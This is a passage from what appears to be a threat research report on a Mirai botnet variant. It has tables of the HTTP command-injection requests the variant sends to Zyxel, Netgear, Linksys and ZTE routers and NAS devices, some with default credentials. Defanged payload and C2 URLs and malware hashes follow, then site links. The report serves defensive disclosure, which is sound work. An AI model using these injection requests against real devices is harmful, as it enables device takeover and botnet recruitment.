| [Zyxel P660HN Remote Command Execution](https://seclists.org/fulldisclosure/2017/Jan/40) | Zyxel P660HN-T routers | POST /cgi-bin/pages/maintenance/logSetting/logSet.asp HTTP/1.1 Host: [IP]:[Port]  Connection: keep-alive  logSetting\_H=1&active=1&logMode=LocalAndRemote&serverPort=123&serverIP=1.1.1.1`;%s+P660HN-T_p%d;`&#    POST /cgi-bin/ViewLog.asp HTTP/1.1  Host: [IP]:[Port]  Connection: keep-alive  remote\_submit\_Flag=1&remote\_syslog\_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote\_host=;%s+P660HN-T\_p%d;#&remoteSubmit=Save |
| [CVE-2016-1555](https://www.exploit-db.com/exploits/45909) | Netgear WG102, WG103, WN604, WNDAP350, WNDAP360, WNAP320, WNAP210, WNDAP660, WNDAP620 devices | GET /boardData102.php?writeData=true&reginfo=0&macAddress=+001122334455+-c+0+;%s+netgear102\_p%d;+echo+# HTTP/1.1 Host: [IP]:[Port]  Connection: keep-alive    GET /boardData103.php?writeData=true&reginfo=0&macAddress=+001122334455+-c+0+;%s+netgear103\_p%d;+echo+# HTTP/1.1  Host: [IP]:[Port]  Connection: keep-alive    GET /boardDataNA.php?writeData=true&reginfo=0&macAddress=+001122334455+-c+0+;%s+netgearNA\_p%d;+echo+# HTTP/1.1  Host: [IP]:[Port]  Connection: keep-alive    GET /boardDataWW.php?writeData=true&reginfo=0&macAddress=+001122334455+-c+0+;%s+netgearWW\_p%d;+echo+# HTTP/1.1  Host: [IP]:[Port]  Connection: keep-alive    GET /boardDataJP.php?writeData=true&reginfo=0&macAddress=+001122334455+-c+0+;%s+netgearJP\_p%d;+echo+# HTTP/1.1  Host: [IP]:[Port]  Connection: keep-alive |
| [CVE-2017-6077](https://www.exploit-db.com/exploits/41394), [CVE-2017-6334](https://www.exploit-db.com/exploits/41459) | Netgear DGN2200 N300 Wireless ADSL2+ Modem Routers | POST /ping.cgi HTTP/1.1 Host: [IP]:[Port]  Authorization: Basic YWRtaW46cGFzc3dvcmQ  Referer: http://%s/DIAG\_diag.htm  IPAddr1=12&IPAddr2=12&IPAddr3=12&IPAddr4=12&ping=Ping&ping\_IPAddr=12.12.12.12;%s+dgn2200v1\_p%d;    POST /dnslookup.cgi HTTP/1.1  Host: [IP]:[Port]  Authorization: Basic YWRtaW46cGFzc3dvcmQ  Referer: http://%s/DIAG\_diag.htm  host\_name=www.google.com;+%s+dgn2200v2\_p%d&lookup=Lookup |
| [Netgear Prosafe Remote Command Execution](https://github.com/threat9/routersploit/blob/master/routersploit/modules/exploits/routers/netgear/prosafe_rce.py) | Netgear Prosafe WC9500, WC7600, WC7520 Wireless Controllers | POST /login\_handler.php HTTP/1.1 Host: [IP]:[Port]  Content-Type: application/x-www-form-urlencoded  Content-Length: 512  reqMethod=json\_cli\_reqMethod&json\_cli\_jsonData=;%s+prosafe\_p%d;+echo+ffffffffffffffff |

Table 1 New exploits used in the Mirai variant

Some other exploits included in this variant have been observed only recently in the wild but were incorporated in variants prior to this one. These exploits are listed in Table 2 below:

| **Vulnerability** | **Affected Devices** | **First seen (in the wild)** | **Exploit Format** |
| --- | --- | --- | --- |
| [Netgear ReadyNAS](https://www.exploit-db.com/exploits/42956) Remote Command Execution/[CVE-2018-15716](https://www.exploit-db.com/exploits/45948) | Netgear ReadyNAS Surveillance 1.4.3-16 and NUUO NVRMini devices | Oct, 2017 | GET /upgrade\_handle.php?cmd=writeuploaddir&uploaddir=%27;%s+readynas%d;%27  HTTP/1.1 Host: [IP]:[Port]  Connection: keep-alive |
| [Linksys WAP54Gv3 Remote Debug Root Shell](https://seclists.org/bugtraq/2010/Jun/93) | Linksys WAP54G Wireless Access Points | Dec, 2018 | POST /debug.cgi HTTP/1.1 Host: [IP]:[Port]  Content-Length: 1024  Connection: keep-alive  Authorization: Basic R2VtdGVrOmdlbXRla3N3ZA    data1=;%s+wap54gv3%d;&command=ui\_debug |
| [CVE-2013-3568](https://www.exploit-db.com/exploits/28484) | Linksys WRT100, WRT110 consumer routers | Dec, 2018 | POST /ping.cgi HTTP/1.1 Host: [IP]:[Port]  Content-Length: 1024  Connection: keep-alive  Authorization: Basic YWRtaW46YWRtaW4  pingstr=&+;%s+wrt100\_p%d; |
| [ZTE Remote Command Execution](https://github.com/stasinopoulos/ZTExploit/blob/master/ZTExploit_Source/ztexploit.py) | ZTE ZXV10 H108L Routers with <= V1.0.01\_WIND\_A01 | Oct, 2018 | GET /getpage.gch?pid=1002&nextpage=manager\_dev\_ping\_t.gch&Host=;+$(;%s+h108l\_p%d;)&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF\_ACTION=new&IF\_IDLE=submit HTTP/1.1 Host: [IP]:[Port]  Connection: keep-alive  Accept-Encoding: gzip, deflate  Accept: \*/\* |
| [Linksys apply.cgi Remote Command Execution](https://www.exploit-db.com/exploits/24936) | Linksys E1500/E2500 routers | - | POST /apply.cgi HTTP/1.1 Host: [IP]:[Port]  Content-Length: 1024  Connection: keep-alive  Authorization: Basic YWRtaW46YWRtaW4  submit\_button=Diagnostics&change\_action=gozila\_cgi&submit\_type=start\_ping&action=&commit=0&ping\_ip=127.0.0.1&ping\_size=&;%s+e1500\_p%d;&ping\_times=5&traceroute\_ip=127.0.0.1    POST /apply.cgi HTTP/1.1  Host: [IP]:[Port]  Content-Length: 1024  Connection: keep-alive  Authorization: Basic YWRtaW46YWRtaW4  submit\_button=Diagnostics&change\_action=gozila\_cgi&submit\_type=start\_ping&action=&commit=0&ping\_ip=127.0.0.1&ping\_size=&;%s+e2500\_p%d;&ping\_times=5&traceroute\_ip=127.0.0.1 |

Table 2 Other exploits in the Mirai variant

The remaining exploits are ones already observed and written about in the context of [previous campaigns](https://unit42.paloaltonetworks.com/unit42-multi-exploit-iotlinux-botnets-mirai-gafgyt-target-apache-struts-sonicwall/) are listed below.

* [CVE-2017-6884](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2017-6884)
* [GPON Exploits](https://autofocus.paloaltonetworks.com/#/tag/Unit42.GPONExploits)
* [AVTechRCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.AVTechRCE)
* [JAWS RCE](https://unit42.paloaltonetworks.com/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns/)
* [DLinkOSInjection](https://autofocus.paloaltonetworks.com/#/tag/Unit42.DLinkOSInjection)
* [DLinkcommandphpRCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.DLinkcommandphpRCE)
* [DLinkDSL2750BOSCmdInjection](https://autofocus.paloaltonetworks.com/#/tag/Unit42.DLinkDSL2750BOSCmdInjection)
* [VacronNVRRCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.VacronNVRRCE)
* [Netgain ‘ping’ Command Injection](https://unit42.paloaltonetworks.com/unit42-multi-exploit-iotlinux-botnets-mirai-gafgyt-target-apache-struts-sonicwall/)
* [EnGeniusRCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.EnGeniusRCE)
* [Linksys RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Linksys_RCE)
* [Netgear](https://www.exploit-db.com/exploits/40889) [cgi-bin RCE](https://www.exploit-db.com/exploits/41598)

## Indicators of Compromise

### **Payload source**

hxxp://www.autourbe[.]com.co/autourbe/language/en-GB/windata/wgetbin[.]sh

### **C2**

epicrustserver[.]cf:3933

### **URLs previously hosting Mirai variant**

hxxp://www.autourbe[.]com.co/autourbe/language/en-GB/windata/clean.mips

hxxp://www.autourbe[.]com.co/autourbe/language/en-GB/windata/clean.mpsl

hxxp://www.autourbe[.]com.co/autourbe/language/en-GB/windata/clean.arm

hxxp://www.autourbe[.]com.co/autourbe/language/en-GB/windata/clean.arm5n

hxxp://www.autourbe[.]com.co/autourbe/language/en-GB/windata/clean.arm7

hxxp://www.autourbe[.]com.co/autourbe/language/en-GB/windata/clean.sh4

hxxp://www.autourbe[.]com.co/autourbe/language/en-GB/windata/clean.spc

hxxp://www.autourbe[.]com.co/autourbe/language/en-GB/windata/clean.x86

hxxp://www.autourbe[.]com.co/autourbe/language/en-GB/windata/clean.ppc

hxxp://www.autourbe[.]com.co/autourbe/language/en-GB/windata/clean.i686

hxxp://www.autourbe[.]com.co/autourbe/language/en-GB/windata/clean.m68k

hxxp://www.autourbe[.]com.co/autourbe/language/en-GB/windata/clean.x86\_64

hxxp://185.248[.]140.102/bins/clean.mips

hxxp://185.248[.]140.102/bins/clean.mpsl

hxxp://185.248[.]140.102/bins/clean.arm

hxxp://185.248[.]140.102/bins/clean.arm5n

hxxp://185.248[.]140.102/bins/clean.arm7

hxxp://185.248[.]140.102/bins/clean.sh4

hxxp://185.248[.]140.102/bins/clean.spc

hxxp://185.248[.]140.102/bins/clean.x86

hxxp://185.248[.]140.102/bins/clean.ppc

hxxp://185.248[.]140.102/bins/clean.i686

hxxp://185.248[.]140.102/bins/clean.m68k

hxxp://185.248[.]140.102/bins/clean.x86\_64

**Samples of new Mirai variant**

00033b5b33b59ad88aa4f196c08eb7a6d2e6ab181ec729e8ed577d55f8b1f3ee

02975fa7929a2f98963d6431f24cf4de702eb42530ac505c47d7567cf002c3d5

05dc7657dc240fe7f42c3ffe95526d161151dd62f8f63188fe666ed86b0347c3

075729594c4883fda420c0749be695d6d771eb61b569ac9b0124738db0f864ef

07f22804757914c7a16e90bdd7ee26596f04995e5f8b90ca8d746c46039bb1c8

09d75b526c79ac98b4c07ca1f28319ac1b6cafcadd0c41b71e82252211390b3d

0b1a51ac04a949197c4c47d589872663be05747e18e20e7f20a24b011f4db0dd

0c42ba60d95eda9cf90f7f1dbe5bcb316d871972eff9722748e9c2a343572484

233094f242ce7626a5a5c1fe46ee205da279e03019b8a391bcc3fa41ce77b647

234a05ac1970af58b6f76dca22aa25bece2ef1d65f4146748f6b859a19f91d31

2764a0a0ab9faf04478fef4fd8ec948da431885cafa6ddf0c23ef8cda379c7d9

28de1263449d88e986e37e7ce74ebc0b6cfceaeb3d5beb5dff296354f33dbf8c

324eb05d47b3114c48f6505db5e4cd7c81110c42488e07c547afd7869690231f

33a8b157e2fdd1acddc5085843a5ac96ee6f9df29c8f48a483bd4eebd16f73cc

36d72d137abc2a43a5f6c00c9a8e41f1faf5e89643e5add1529f7343a731856f

3eccc01f6677567b0aeea89b6e50c7184698732287c29f95000acc102c02dd47

3f299938339bc426c5d78b55a1398da31f948f7c30d6115ab30a656cdd78de35

403e702fa7e8b0a4ebde7db2e505645507b12ef0306619fb2523dea5cdf2f40d

4111155bfc2f0b005d763ff4cd05e60187bdc29d3b17d0971f736da779595a9a

4495af4264d11e339c4ba9776fd79c7b5554b70bbb6cc875ed7a03b7eef15f8a

44ae362714ba76c65150a363b0b340a5bd422649e48df37661ba1db8e0ec0f9e

46a58cfa883c71b9066b2ffe7ce475676570e9940327782927b559ea9a47df88

4a7bd1ab7a9505dec2d83f44b2d99f3068823db9d9d888333ccfdd239cc72192

4ebbcfeaad77207f82d072651cae53741e6af464c61735e33e385fba8edf3f61

4f3e5d72f53d59f932b606f440428608b5bbd4afa8ed33148e322e0096465130

5ebfd332bc5b9697d7b07e37600d495489da1b892288f051c56c8aba9574bed7

613e74f2d3549fe9b76eaa404b20fe87ea89672c4bf2f0d1cf88be4d657ea323

684a4c2e426a146c2217d3e62b7f7c69ea12628d182b2441c840bddacc1597f2

77b059f2f5b62d059fd9e3dfaf41cbeb7543ef288410f3c85a090bf03be99b24

884929e31c2cb8dc7e51949d94fe5073216be967f83f8013e0980d8959141234

892efa131b0cd6ca87fa0c2e3006c8352947cfc40ac0adf51a55b711a806aa80

8c9a3f8c94210813287b2789f63410d4744f3422a8012d6b1bc60a307884732c

8d1700c0144d6e56d8ba4e4061694c1194a7d0bc63740a1bdebf2697e46b3978

8d28628e8a31b39e178ba8c7dd781ea19db5ec3fe20f84ba20228c47a49aa543

8eb7eafb26235796534ba9deeada27b4e25e7c45d9b87715ee6d4182b3ca6068

8f2e458607f85f4c22ca7135df5fa2649c9979f2bb69036b3c63de52ec2f14f0

938e836c5035d52f954ff91fd5008a9444a3efa3e07592ceefc9efebd260b085

95ee8502a7cbac8cb21471fc40d86ddefa87ef9790f0c06d47fe47c3a2278396

9d37c617dacfef668548beee55a6b1d3899ffce3e7999d43159e228dcae1db01

a4923ae6bf36a5c5507ed4e7f0c7b92524df04e132c1823e611ed584e5495186

a61717a8c64301f20ac01f6fd7462d3303a72c9ed131fdd24cd6b12eb788377b

a6d3081703359ee1879b2ce9c85d0c3f4ed4b319db6ecebd18054982bcf1603c

ae7d250606c543b241b1809158a2668408c9ecaaf3ce4d51e08700f78534ce31

b1cac267d0e3456f9da90955027e55ad1b78a7bf60f11914e959814c90ea7cc6

b29334ca77f72587430fde00791daa1262972d315238d624e94238dda32e9240

b34b43d240c89d1e9bbd9d99c6050afc7efa62323d7788a46801576c5b1de0ab

b57b14f16c41a06b1f434f60cdc9bc380a4ff1ad5b7d8edc87c097cee6f3d233

b8d284ba89b562923d1eed2e67517dc8772977decc49d5f82d75237d4a8937e6

ba0d0e16b54aa6aaca3ab1ca2afa78148e823ae228d5f790e0279bb87dba5495

bb5f7f92f4aa7cfdc0691037dc50549ccc705685bdd6f375c884bc68518b7e59

bb9d7a86f107586dc8d99244a662c83c6f7667696b411292162dcb47d95d4c9b

bc3eb0f7c8d4ecdacddac5d9ccc6ac44b6f6081f051d8890c5986faa37f56623

bd5afefa044494010150501822f5f32be4300f482f8c8904d9fd1a30f5722fdd

bdac2ed66c0f5633f5f12910bc9c03173be1fc51a76e495a36d700ba4ddc9da4

c1ad4b2c0e71d2a92e4d9a4d2de01f750b8758fa3fe8a85631aaf870615b6769

c30654f9bfd036f75a9c4a0f991f141243c821dbfc2b4d2ae308e68c4d232a57

c86328964dfc86ca70c722e300f533bafaf234b2007867c6bf6a4e4be47cf8ca

d049406662f083507dcd7278fa25bec0e93be06511ce290ed9ff309b514857a0

d996a37b3bb09386b2e1e6a915b83c448065f0139d3c8057bf67e85d01ada9d1

dc866393e6a549afd56d7a7a7411a4eff7f0cb37fe1964c4f87e4228d46c8eb2

ddaa6c58ac7ed29166af6a337500ea5ca6ca54191a4176178e1cb1a351064c4e

e3c250062292daaff815345e87fb9f28e7ac683338c58de7a3a9cc743f6200e6

e5432946188a1c644e23159ae588797bd967ddc1f983956878e0ad0590efc73a

e60451a0b5dd0b875263c8e7c74773971b0faba783957c2a305ddf5356c9d567

e6156246bb85ca4a64377d3b68b6f34805b8a6a84890a9eada984fc29bfa36e1

ec4eef0d92105d9b82888bce94f0a2e00988f3be1a6005c889b91afd7fd05835

f01f85f9068f3c01193a0fb4b20a37573748914292a606da5cb2b5749b720366

f32176c3799fd3bc3a2a24c162861d12f987db548e9ef94c3bc8c6156bcd4fe3

f370a635db07bbd788991e898d8aa9be78ba0457cec3bd3e869ddc11e5693b5e

f9bd8d0ae187a27d8d1ad54e8c8b551488f66141e4590ac7583cf470a2ab260d

fab198f5f460b0591899bd218df79d2b50ec71ec2dd0494f1fa2bd07ba887aed

fe92e66c0c5a4402972a3bf7473b98a13c067beddcba500443d194f022ca4194

### **URLs previously hosting Gafgyt**

hxxp://185.248[.]140.102/eeppinen.arm

hxxp://185.248[.]140.102/eeppinen.arm7

hxxp://185.248[.]140.102/eeppinen.armv4l

hxxp://185.248[.]140.102/eeppinen.i586

hxxp://185.248[.]140.102/eeppinen.i686

hxxp://185.248[.]140.102/eeppinen.mips

hxxp://185.248[.]140.102/eeppinen.mipsel

hxxp://185.248[.]140.102/eeppinen.m68k

hxxp://185.248[.]140.102/eeppinen.x86

hxxp://185.248[.]140.102/eeppinen.ppc

hxxp://185.248[.]140.102/eeppinen.sh4

hxxp://185.248[.]140.102/eeppinen.sparc

### **Gafgyt sample hashes**

070405b85448d15afe619584c3f3cc851ed43098f57ef88981edd22b663030e7

19e2e20d994ba7c8af6537f640ef14459b66f333a7e5b28ef733ac81b43a628b

36562e6f3917ea80fcd241bca96fe96eb4f7328b14afd2c4b528bef9ce4b21da

573d539b78cdbb6d199d48ea986a5ba18c293253e48e2072e9871eb5460b2ae7

5aede6d1b0376f2e8c3c292f39357137a32c8ff1a3c60c594775081707647f59

6efb0d2304ce4c63205c6b502ba65a7f1b7eb87b055c0c5dcbb0120f49383588

85ac0d7ce9c899ec12c8efff89f5fcb1ed8b87623bf6a1457d53f3d1dce5c71d

c62c5d6255b6c1b5e8fa1861122adc180b36fbf4878f175e29367c7f6b08d7c9

db5fae3cd9ac7338e3d9fe302ffe5e261a9cafca75458523343f3562a0362ae8

dd1ab1f58494611af68d7d4dbe548234f0429b0f0c3d42135dce8f4339a16a7b

e0d4f82f5d1a20ca447c26b454be18aa7478a853d3526317972cb6ca9d847f29

e14ff28d2188ff0f665468bd0e17db21f3f11292b85c2a370596481cdf7c835f

![]()

Back to top
### Tags

* [Defense](https://unit42.paloaltonetworks.com/tag/defense/ "Defense")
* [Education](https://unit42.paloaltonetworks.com/tag/education/ "Education")
* [Finance](https://unit42.paloaltonetworks.com/tag/finance/ "Finance")
* [Government](https://unit42.paloaltonetworks.com/tag/government/ "Government")
* [Health care](https://unit42.paloaltonetworks.com/tag/health-care/ "health care")
* [High Tech](https://unit42.paloaltonetworks.com/tag/high-tech/ "High Tech")
* [IoT](https://unit42.paloaltonetworks.com/tag/iot/ "IoT")
* [Linux](https://unit42.paloaltonetworks.com/tag/linux/ "Linux")
* [Mirai](https://unit42.paloaltonetworks.com/tag/mirai/ "Mirai")
* [Retail](https://unit42.paloaltonetworks.com/tag/retail/ "Retail")

[Threat Research Center](https://unit42.paloaltonetworks.com "Threat Research")
[Next: DNS Tunneling: how DNS can be (ab)used by malicious actors](https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/ "DNS Tunneling: how DNS can be (ab)used by malicious actors")

### Table of Contents

### Related Articles

* [Threat Assessment: Howling Scorpius (Akira Ransomware)](https://unit42.paloaltonetworks.com/threat-assessment-howling-scorpius-akira-ransomware/ "article - table of contents")
* [Threat Assessment: Ignoble Scorpius, Distributors of BlackSuit Ransomware](https://unit42.paloaltonetworks.com/threat-assessment-blacksuit-ransomware-ignoble-scorpius/ "article - table of contents")
* [FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications](https://unit42.paloaltonetworks.com/frostygoop-malware-analysis/ "article - table of contents")

## Related Malware Resources

![A pictorial representation of a jailbreaking technique. Abstract digital tunnel with glowing blue lights and intricate patterns, representing data or technology.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 31, 2024
[#### Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability](https://unit42.paloaltonetworks.com/multi-turn-technique-jailbreaks-llms/)

* [GenAI](https://unit42.paloaltonetworks.com/tag/genai/ "GenAI")
* [Prompt injection](https://unit42.paloaltonetworks.com/tag/prompt-injection/ "prompt injection")
* [Jailbroken](https://unit42.paloaltonetworks.com/tag/jailbroken/ "jailbroken")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/multi-turn-technique-jailbreaks-llms/ "Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability")

![Pictorial representation of using LLMs to obfuscate malicious JavaScript detection. A man wearing glasses, looking intently at a screen with reflections visible in the glasses of computer code.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 20, 2024
[#### Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript](https://unit42.paloaltonetworks.com/using-llms-obfuscate-malicious-javascript/)

* [Credential stealer](https://unit42.paloaltonetworks.com/tag/credential-stealer/ "credential stealer")
* [Data Augmentation](https://unit42.paloaltonetworks.com/tag/data-augmentation/ "Data Augmentation")
* [FraudGPT](https://unit42.paloaltonetworks.com/tag/fraudgpt/ "FraudGPT")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/using-llms-obfuscate-malicious-javascript/ "Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript")

![Pictorial representation of attackers leveraging Active Directory or LDAP. Close-up view of a server rack panel with illuminated lights and a digital display reading 'SYSTEM HACKED'.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 17, 2024
[#### LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory](https://unit42.paloaltonetworks.com/lightweight-directory-access-protocol-based-attacks/)

* [Stately Taurus](https://unit42.paloaltonetworks.com/tag/stately-taurus/ "Stately Taurus")
* [ALPHV](https://unit42.paloaltonetworks.com/tag/alphv/ "ALPHV")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/lightweight-directory-access-protocol-based-attacks/ "LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory")

![Pictorial representation of HeartCrypt. A laptop on a desk displaying a vivid graphical interface with cyber security and data analytics themes, illuminated by red ambient lighting.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 13, 2024
[#### Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation](https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/)

* [Redline infostealer](https://unit42.paloaltonetworks.com/tag/redline-infostealer/ "Redline infostealer")
* [Lumma Stealer](https://unit42.paloaltonetworks.com/tag/lumma-stealer/ "Lumma Stealer")
* [Remcos](https://unit42.paloaltonetworks.com/tag/remcos/ "Remcos")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/ "Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation")

![Pictorial representation of suspicious registration scam campaigns. Close-up image of a glowing red WiFi connectivity symbol on a textured black surface, symbolizing digital security technology.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 6, 2024
[#### Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams](https://unit42.paloaltonetworks.com/suspicious-domain-registration-campaigns/)

* [Network scanning](https://unit42.paloaltonetworks.com/tag/network-scanning/ "network scanning")
* [Cybersquatting](https://unit42.paloaltonetworks.com/tag/cybersquatting/ "cybersquatting")
* [ChatGPT](https://unit42.paloaltonetworks.com/tag/chatgpt/ "ChatGPT")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/suspicious-domain-registration-campaigns/ "Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams")

![Close-up of a person wearing glasses, reflecting computer code on the lens.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) November 22, 2024
[#### Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples](https://unit42.paloaltonetworks.com/unique-popular-techniques-lateral-movement-macos/)

* [Remote Code Execution](https://unit42.paloaltonetworks.com/tag/remote-code-execution/ "Remote Code Execution")
* [Python](https://unit42.paloaltonetworks.com/tag/python/ "Python")
* [MacOS](https://unit42.paloaltonetworks.com/tag/macos/ "macOS")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/unique-popular-techniques-lateral-movement-macos/ "Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples")

![Pictorial representation of FrostyGoop malware. Close-up view of a digital screen displaying a pixelated, abstract image, possibly representing a face.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) November 19, 2024
[#### FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications](https://unit42.paloaltonetworks.com/frostygoop-malware-analysis/)

* [BUSTLEBERM](https://unit42.paloaltonetworks.com/tag/bustleberm/ "BUSTLEBERM")
* [FrostyGoop](https://unit42.paloaltonetworks.com/tag/frostygoop/ "FrostyGoop")
* [Go](https://unit42.paloaltonetworks.com/tag/go/ "Go")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/frostygoop-malware-analysis/ "FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications")

![Pictorial representation of a threat like the Bring Your Own Vulnerable Driver (BYOVD) technique. Image of computer code on a screen with a prominent biohazard symbol.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) November 1, 2024
[#### TA Phone Home: EDR Evasion Testing Reveals Extortion Actor's Toolkit](https://unit42.paloaltonetworks.com/edr-bypass-extortion-attempt-thwarted/)

* [Extortion](https://unit42.paloaltonetworks.com/tag/extortion/ "Extortion")
* [Data exfiltration](https://unit42.paloaltonetworks.com/tag/data-exfiltration/ "data exfiltration")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/edr-bypass-extortion-attempt-thwarted/ "TA Phone Home: EDR Evasion Testing Reveals Extortion Actor's Toolkit")

![Pictorial representation of a campaign like Contagious Interview. Digital graphic of a glowing globe with network connections and data streams, symbolizing global connectivity and technology advancements.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) October 9, 2024
[#### Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware](https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/)

* [North Korea](https://unit42.paloaltonetworks.com/tag/north-korea/ "North Korea")
* [Social engineering](https://unit42.paloaltonetworks.com/tag/social-engineering/ "social engineering")
* [Python](https://unit42.paloaltonetworks.com/tag/python/ "Python")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/ "Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware")

![A pictorial representation of machine learning detecting vulnerability scanning. A Black man using a tablet with a background of illuminated city buildings at night.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) October 1, 2024
[#### Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning](https://unit42.paloaltonetworks.com/machine-learning-new-swiss-army-suite-tool/)

* [Machine Learning](https://unit42.paloaltonetworks.com/tag/machine-learning/ "Machine Learning")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/machine-learning-new-swiss-army-suite-tool/ "Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning")

* ![Slider arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg)
* ![Slider arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg)

![Close button](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg)
![Enlarged Image]()

![Newsletter]()

![UNIT 42 Small Logo]()
Get updates from Unit 42
## Peace of mind comes from staying ahead of threats. Contact us today.

Your Email

Subscribe for email updates to all Unit 42 threat research.
By submitting this form, you agree to our [Terms of Use](https://www.paloaltonetworks.com/legal-notices/terms-of-use "Terms of Use") and acknowledge our [Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/privacy "Privacy Statement")

Invalid captcha!

Subscribe ![Right Arrow]()
![loader](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-loader.svg)

### Products and services

* [Network Security Platform](https://www.paloaltonetworks.com/network-security "Network Security Platform")
* [CLOUD DELIVERED SECURITY SERVICES](https://www.paloaltonetworks.com/network-security/security-subscriptions "CLOUD DELIVERED SECURITY SERVICES")
* [Advanced Threat Prevention](https://www.paloaltonetworks.com/network-security/advanced-threat-prevention "Advanced Threat Prevention")
* [DNS Security](https://www.paloaltonetworks.com/network-security/advanced-dns-security "DNS Security")
* [Data Loss Prevention](https://www.paloaltonetworks.com/network-security/enterprise-data-loss-prevention "Data Loss Prevention")
* [IoT Security](https://www.paloaltonetworks.com/network-security/enterprise-iot-security "IoT Security")

* [Next-Generation Firewalls](https://www.paloaltonetworks.com/network-security/next-generation-firewall "Next-Generation Firewalls")
* [Hardware Firewalls](https://www.paloaltonetworks.com/network-security/next-generation-firewall-hardware "Hardware Firewalls")
* [Strata Cloud Manager](https://www.paloaltonetworks.com/network-security/strata-cloud-manager "Strata Cloud Manager")

* [SECURE ACCESS SERVICE EDGE](https://www.paloaltonetworks.com/sase "SECURE ACCESS SERVICE EDGE")
* [Prisma Access](https://www.paloaltonetworks.com/sase/access "Prisma Access")
* [Prisma SD-WAN](https://www.paloaltonetworks.com/sase/sd-wan "Prisma SD-WAN")
* [Autonomous Digital Experience Management](https://www.paloaltonetworks.com/sase/adem "Autonomous Digital Experience Management")
* [Cloud Access Security Broker](https://www.paloaltonetworks.com/sase/next-gen-casb "Cloud Access Security Broker")
